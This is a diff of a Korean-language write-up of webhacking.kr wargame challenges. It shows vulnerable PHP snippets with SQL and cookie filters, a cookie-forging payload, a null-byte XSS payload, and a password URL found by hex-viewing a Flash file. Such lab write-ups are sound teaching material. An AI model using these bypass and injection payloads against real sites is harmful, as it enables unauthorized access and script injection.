@@ -1,7 +1,6 @@
-# webhacking.kr write up
-블로그가 너무 느려서 마크다운으로 갈아탔다
+# webhacking.kr write-up
 
-## challenge 1
+## Challenge 1
 ```php
 $password="????";
 if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;
@@ -14,7 +13,7 @@ echo("<br>level : $_COOKIE[user_lv]");
 ### payload
 `document.cookie = "user_lv=5.1"`
 
-## challenge 18
+## Challenge 18
 ```php
 if(eregi(" |/|\(|\)|\t|\||&|union|select|from|0x",$_GET[no])) exit("no hack"); 
 $q=@mysql_fetch_array(mysql_query("select id from challenge18_table where id='guest' and no=$_GET[no]")); 
@@ -25,10 +24,12 @@ if($q[0]=="admin") {
 } 12
 ```
 
-## challenge 23
-![prob23](./img/chal23.png)<br>
+
+## Challenge 23
 `Your mission is to inject <script>alert(1);</script>`이라고 한다.
 그냥 GET으로 넘길 때 code값 맨 앞에 NULL(%00)을 추가해 주면 풀린다.
 ### payload
 `http://webhacking.kr/challenge/bonus/bonus-3/index.php?code=%00<script>alert(1);</script>`
 
+## Challenge 58
+문제 페이지에 들어가면 플래시로 되어있는 로그인 창이 뜬다. 게싱으로 몇 가지 패스워드를 넣어봤지만 되지 않아서 플래시 파일을 다운로드 받은뒤 iHex로 열었다. 파일 맨 뒷 부분에 보면 `http://webhacking.kr/challenge/web/web-35/g1v2m2passw0rd.php`이 있다. 들어가면 문제가 풀린다!
